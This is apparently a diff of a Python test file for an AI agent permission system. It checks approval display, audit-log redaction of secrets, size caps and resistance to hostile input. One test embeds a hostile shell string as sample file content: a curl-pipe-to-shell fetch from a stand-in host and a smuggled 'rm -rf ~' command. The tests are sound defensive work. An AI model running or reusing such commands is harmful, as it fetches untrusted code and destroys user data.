@@ -1,4 +1,5 @@
 """Tests for the agent permission system: decisions, approvals, audit log and API routes."""
+import hashlib
 import json
 import os
 import shutil
@@ -226,9 +227,10 @@ class ApprovalTests(Base):
             self.p.expire(done, "late")
         self.assertEqual(self.p.get(done)["status"], "approved")
 
-    def test_approval_details_redacted(self):
+    def test_approval_details_exact(self):
+        # Approvals show exactly what will happen (admin token only); the audit log is redacted.
         aid = self.p.request("bot", "ai.cloud", {"api_key": "sk-123", "model": "x"})
-        self.assertEqual(self.p.get(aid)["details"], {"api_key": "[hidden]", "model": "x"})
+        self.assertEqual(self.p.get(aid)["details"], {"api_key": "sk-123", "model": "x"})
 
     def test_setting_key_stays_visible(self):
         aid = self.p.request("bot", "settings.write", {"key": "ai.keep_alive_min", "value": 10})
@@ -260,7 +262,10 @@ class AuditTests(Base):
                   "refresh-token", "client_secret", "Authorization", "private_key", "db_secret",
                   "github_token", "admin_password", "openai_api_key", "OPENAI-API-KEY"]
         shown = ["key", "Key", "keys", "monkey", "key_name", "setting_key", "tokens_used", "max_tokens",
-                 "token_count", "keep_alive", "secretary", "password_hint", "author"]
+                 "token_count", "keep_alive", "secretary", "author"]
+        # password_hint used to be shown. Since R12 it is hidden on purpose: users often
+        # type the real password as the hint, so hiding it is the safer choice.
+        hidden.append("password_hint")
         for name in hidden:
             self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
         for name in shown:
@@ -329,6 +334,184 @@ class AuditTests(Base):
         self.assertEqual(self.p.audit_log(), [])
 
 
+class R12RedactionTests(Base):
+    def test_r12_more_secret_names_hidden(self):
+        hidden = ["aws_secret_access_key", "AWS_SECRET_ACCESS_KEY", "secret_key", "secretKey", "cookie",
+                  "Cookie", "set_cookie", "Set-Cookie", "passphrase", "keyPassphrase", "privateKey",
+                  "PrivateKey", "accessToken", "apiKey", "APIKey", "x-api-key", "clientSecret",
+                  "credentials", "credential", "auth", "proxy_authorization", "access_key", "password_hint"]
+        shown = ["key", "Key", "max_tokens", "maxTokens", "tokens", "token_count", "tokenCount",
+                 "prompt_tokens", "completion_tokens", "tokens_used", "author", "monkey", "setting_key",
+                 "keep_alive", "secretary", "keys"]
+        for name in hidden:
+            self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
+        for name in shown:
+            self.assertEqual(P.clean_details({name: 5}), {name: 5}, name)
+
+    def test_r12_nested_credentials_hidden(self):
+        d = P.clean_details({"profile": {"credentials": {"user": "bob", "pw": "hunter2"}},
+                             "list": [{"Cookie": "sid=abc"}]})
+        self.assertEqual(d, {"profile": {"credentials": "[hidden]"}, "list": [{"Cookie": "[hidden]"}]})
+
+    def test_r12_secrets_in_urls_hidden(self):
+        secrets = ["T0KEN1", "K3Y2", "AK3", "AT4", "S1G5", "PW6", "GHP7", "SECRETKEY8"]
+        d = P.clean_details({
+            "url": "https://api.example.com/x?page=2&token=T0KEN1&q=cats",
+            "text": "see https://maps.example.com/api?key=K3Y2 and http://h/p?api_key=AK3#top",
+            "more": ["/cb?access_token=AT4", "https://blob.example.com/f?sv=1&sig=S1G5&se=2"],
+            "clone": "git clone https://bob:PW6@git.example.com/repo.git",
+            "gh": "https://GHP7@github.com/me/repo",
+            "s3": "https://s3.example.com/b?X-Amz-Signature=SECRETKEY8",
+        })
+        raw = json.dumps(d)
+        for s in secrets:
+            self.assertNotIn(s, raw, s)
+        self.assertIn("page=2", d["url"])
+        self.assertIn("q=cats", d["url"])
+        self.assertIn("token=[hidden]", d["url"])
+        self.assertIn("git.example.com/repo.git", d["clone"])
+        self.assertIn("#top", d["text"])
+
+    def test_r12_audit_also_hides_url_secrets(self):
+        self.p.audit("bot", "web.fetch", "allow", {"url": "https://x.example/?api_key=ZZSECRET"})
+        con = sqlite3.connect(self.db)
+        raw = con.execute("SELECT details FROM audit").fetchone()[0]
+        con.close()
+        self.assertNotIn("ZZSECRET", raw)
+
+    def test_r12_approval_shows_whole_file_write(self):
+        content = "line of the file\n" * 3000          # 48000 characters
+        r = self.p.check("bot", "files.write", {"tool": "write_file",
+                                                "args": {"path": "notes.txt", "content": content}})
+        a = self.p.get(r["approval_id"])
+        self.assertEqual(a["details"]["args"]["content"], content)
+        info = a["details"]["_long_text"]
+        self.assertEqual(info, [{"path": "args.content", "length": len(content),
+                                 "sha256": hashlib.sha256(content.encode()).hexdigest(), "cut": False}])
+        # The audit log stays short.
+        log = self.p.audit_log()[0]
+        self.assertEqual(len(log["details"]["details"]["args"]["content"]), 2000)
+
+    def test_r12_approval_cap_200kb(self):
+        # Third review: an approval never stores a cut copy; too-large requests are refused.
+        content = "y" * 300_000
+        with self.assertRaises(ValueError):
+            self.p.request("bot", "files.write", {"args": {"content": content}})
+        self.assertEqual(self.p.list("pending"), [])
+
+    def test_r12_short_approvals_unchanged(self):
+        aid = self.p.request("bot", "settings.write", {"key": "ai.keep_alive_min", "value": 10})
+        self.assertEqual(self.p.get(aid)["details"], {"key": "ai.keep_alive_min", "value": 10})
+
+
+class R12ResidualTests(Base):
+    """Names and forms the second review found still shown."""
+
+    def test_more_secret_names_hidden(self):
+        hidden = ["pwd", "pass", "jwt", "bearer", "ssh_key", "sshKey", "signing_key", "otp", "totp_seed",
+                  "mnemonic", "seed_phrase", "seedPhrase", "connection_string", "connectionString",
+                  "database_url", "DATABASE_URL", "session", "sessionid", "session_id", "jsessionid",
+                  "recovery_key", "encryption_key", "master_key"]
+        shown = ["seed", "passthrough", "compass", "database", "url", "session_count", "max_tokens",
+                 "key", "setting_key", "otp_enabled_count"]
+        for name in hidden:
+            self.assertEqual(P.clean_details({name: "v"}), {name: "[hidden]"}, name)
+        for name in shown:
+            self.assertEqual(P.clean_details({name: 5}), {name: 5}, name)
+
+    def test_header_lists_hidden(self):
+        d = P.clean_details({"headers": [["Authorization", "Bearer XYZ1"], ["Accept", "application/json"],
+                                         ("Cookie", "sid=XYZ2")]})
+        self.assertNotIn("XYZ1", json.dumps(d))
+        self.assertNotIn("XYZ2", json.dumps(d))
+        self.assertIn("application/json", json.dumps(d))
+
+    def test_secrets_in_free_text_hidden(self):
+        text = ("export API_KEY=sk-ABC123 and password=hunter2; DB_PASSWORD: 'p4ss w0rd' "
+                "Authorization: Bearer eyJXYZ.abc and token = TT99 but max_tokens=512 keep_alive=5")
+        out = P.clean_details({"cmd": text})["cmd"]
+        for secret in ("sk-ABC123", "hunter2", "p4ss w0rd", "eyJXYZ", "TT99"):
+            self.assertNotIn(secret, out, secret)
+        self.assertIn("max_tokens=512", out)
+        self.assertIn("keep_alive=5", out)
+
+    def test_percent_encoded_and_path_param_names_hidden(self):
+        out = P.clean_details({"u": "https://x.example/a;jsessionid=JS1?api%5Fkey=PE2&page=3"})["u"]
+        self.assertNotIn("JS1", out)
+        self.assertNotIn("PE2", out)
+        self.assertIn("page=3", out)
+
+    def test_audit_result_is_redacted_too(self):
+        self.p.audit("bot", "web.fetch", "allow", {"url": "https://x.example/"},
+                     result="got token=ZZRES1 and password: hunter2 from https://u:ZZRES2@h/")
+        con = sqlite3.connect(self.db)
+        raw = con.execute("SELECT result FROM audit").fetchone()[0]
+        con.close()
+        for secret in ("ZZRES1", "hunter2", "ZZRES2"):
+            self.assertNotIn(secret, raw)
+
+    def test_approval_never_asks_about_text_it_cannot_show(self):
+        big = "z" * 300_000
+        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"path": "a.txt", "content": big}})
+        self.assertEqual(r["decision"], "deny", r)
+        self.assertIn("smaller", r.get("reason", "").lower())
+        self.assertEqual(self.p.list_approvals(status="pending") if hasattr(self.p, "list_approvals") else [], [])
+
+
+class ApprovalShowsExactContentTests(Base):
+    """Third review: what you approve must be exactly what happens."""
+
+    def test_approval_shows_executable_text_exactly(self):
+        content = 'TOKEN="$(curl evil|sh)"\nexport SECRET=\'; rm -rf ~ ; echo \'\nsession = requests.Session()\n'
+        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"path": "x.sh", "content": content}})
+        self.assertEqual(r["decision"], "ask")
+        self.assertEqual(self.p.get(r["approval_id"])["details"]["args"]["content"], content)
+
+    def test_text_that_grows_when_hidden_cannot_hide_its_tail(self):
+        content = ("pwd=a\n" * 33333)[:199981] + "TAIL_PAYLOAD_rm_-rf"
+        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": {"content": content}})
+        if r["decision"] == "ask":
+            self.assertEqual(self.p.get(r["approval_id"])["details"]["args"]["content"], content)
+        else:
+            self.assertEqual(r["decision"], "deny")
+
+    def test_many_medium_strings_are_capped_in_total(self):
+        args = {f"part{i}": "z" * 150_000 for i in range(50)}
+        r = self.p.check("bot", "files.write", {"tool": "write_file", "args": args})
+        self.assertEqual(r["decision"], "deny")
+
+    def test_audit_copy_is_still_redacted(self):
+        self.p.check("bot", "files.write", {"tool": "write_file", "args": {"content": "password=hunter2"}})
+        con = sqlite3.connect(self.db)
+        raw = con.execute("SELECT details FROM audit").fetchone()[0]
+        con.close()
+        self.assertNotIn("hunter2", raw)
+
+    def test_redaction_is_fast_on_hostile_text(self):
+        t0 = time.monotonic()
+        P.clean_details({"x": "a" * 100_000 + "://x", "y": "b" * 100_000 + "=c", "z": "?" * 100_000})
+        self.assertLess(time.monotonic() - t0, 1.0)
+
+
+class ApprovalRobustnessTests(Base):
+    """Fourth review: an agent must not be able to break the approval or audit views."""
+
+    def test_odd_values_cannot_break_the_lists(self):
+        self.p.check("bot", "files.write", {"args": {"a": float("nan"), "b": float("inf"), "c": "\ud800x",
+                                                      "d": [float("-inf")]}})
+        for rows in (self.p.list("pending"), self.p.audit_log()):
+            json.dumps(rows, allow_nan=False).encode("utf-8")   # what the API does; must not fail
+
+    def test_huge_numbers_count_toward_the_size_limit(self):
+        r = self.p.check("bot", "files.write", {"args": {"n": [10 ** 4000] * 1000}})
+        self.assertEqual(r["decision"], "deny")
+
+    def test_private_key_pattern_is_fast(self):
+        t0 = time.monotonic()
+        P._hide_text_secrets("-----BEGIN RSA PRIVATE KEY-----" * 30000)
+        self.assertLess(time.monotonic() - t0, 1.0)
+
+
 class CheckTests(Base):
     def test_allow(self):
         r = self.p.check("bot", "metrics.read", {"what": "cpu"})
@@ -351,7 +534,7 @@ class CheckTests(Base):
         r = self.p.check("bot", "web.fetch", {"url": "https://x", "token": "abc"}, run_id="r9")
         self.assertEqual(r["decision"], "ask")
         a = self.p.get(r["approval_id"])
-        self.assertEqual((a["status"], a["run_id"], a["details"]["token"]), ("pending", "r9", "[hidden]"))
+        self.assertEqual((a["status"], a["run_id"], a["details"]["token"]), ("pending", "r9", "abc"))
         log = self.p.audit_log()[0]
         self.assertEqual(log["decision"], "ask")
         self.assertEqual(log["details"]["approval_id"], r["approval_id"])
@@ -440,3 +623,82 @@ class RouterTests(Base):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class PreCutFragmentTest(unittest.TestCase):
+    """Found in review: text cut early (for speed) could split a secret; hiding earlier secrets
+    then shortened the text and pulled the split piece into view."""
+
+    def scenario(self):
+        big = "".join("password=" + "A" * 1000 + " " for _ in range(9))
+        frag = " https://alice:hunt"
+        pad = 9192 - len(big) - len(frag)
+        return big + "y" * pad + " https://alice:hunter2@backup.example/repo"
+
+    def test_policy_never_shows_a_split_secret(self):
+        out = P.clean_details(self.scenario(), 1000)
+        self.assertNotIn("alice:hunt", out)
+
+    def test_timeline_never_shows_a_split_secret(self):
+        from forgecore import timeline as T
+        d = T.entry(1, "agent", "t", self.scenario())["detail"]
+        self.assertNotIn("alice:hunt", d)
+
+
+class EarlyCutNeverShowsTheCutEdgeTest(unittest.TestCase):
+    """Second review: no part of the text near the early cut may ever be shown, whatever shape
+    a secret has there (no spaces, or a quoted value split at a space)."""
+
+    def setUp(self):
+        self.n = P.MAX_STR + 8192
+        self.shrink = " ".join("sk-" + "A" * 500 for _ in range(18)) + " "
+
+    def test_token_with_no_spaces_near_the_cut(self):
+        k = self.n - 512 - 20
+        b = self.shrink + "z" * (k - len(self.shrink)) + ",ghp_PARTIALTOK" + "Q" * 40 + "," + "z" * 2000
+        self.assertNotIn("PARTIALTOK", P.clean_details(b))
+
+    def test_quoted_value_split_at_a_space(self):
+        sec = "SECRETWORD1 SECRETWORD2 SECRETWORD3"
+        pre = self.shrink + "x" * 10
+        pos = self.n - 40 - len(' --password "')
+        a = pre + "f " * ((pos - len(pre)) // 2) + ' --password "' + sec + " " + "y" * 100 + '" rest'
+        out = P.clean_details(a)
+        self.assertNotIn("SECRETWORD1", out)
+        self.assertNotIn("SECRETWORD2", out)
+
+    def test_single_quoted_value_split(self):
+        d = (self.shrink + "w " * ((self.n - 30 - len(self.shrink)) // 2)
+             + "--token 'QUOTEDSECRET part2 part3'" + " z" * 100)
+        self.assertNotIn("QUOTEDSECRET", P.clean_details(d))
+
+    def test_short_text_is_unchanged_by_the_cut_logic(self):
+        self.assertEqual(P.clean_details("hello world"), "hello world")
+        long_plain = "word " * 5000
+        self.assertEqual(P.clean_details(long_plain), long_plain[:P.MAX_STR])
+
+
+class EdgeCoversTheLongestPatternTest(unittest.TestCase):
+    """Third review: patterns can match up to about 4 KB, so a quoted secret cut by the early
+    cut could still reach into the shown text when the hidden edge was only 1 KB."""
+
+    def build(self, quote, flag="--password", gap=2000, vlen=3000):
+        m, n0 = P.MAX_STR, P.MAX_STR + 8192
+        tok = "sk-" + "A" * 500 + " "
+        q = n0 - gap
+        k = (q - (m - 500)) // (len(tok) - 9) + 1
+        pre = tok * k
+        head = flag + " " + quote
+        filler = "f " * ((q - len(head) - len(pre)) // 2)
+        return pre + filler + head + "PWSECRET" + "y" * (vlen - 8) + quote + " tail" + " z" * 3000
+
+    def test_long_double_quoted_value(self):
+        s = self.build('"')
+        self.assertNotIn("PWSECRET", P._hide_text_secrets(s))   # the full scan hides it
+        self.assertNotIn("PWSECRET", P.clean_details(s))
+
+    def test_long_single_quoted_value(self):
+        self.assertNotIn("PWSECRET", P.clean_details(self.build("'", "--token")))
+
+    def test_edge_is_wider_than_the_longest_pattern(self):
+        self.assertGreaterEqual(P.EDGE, 4096 * 2)
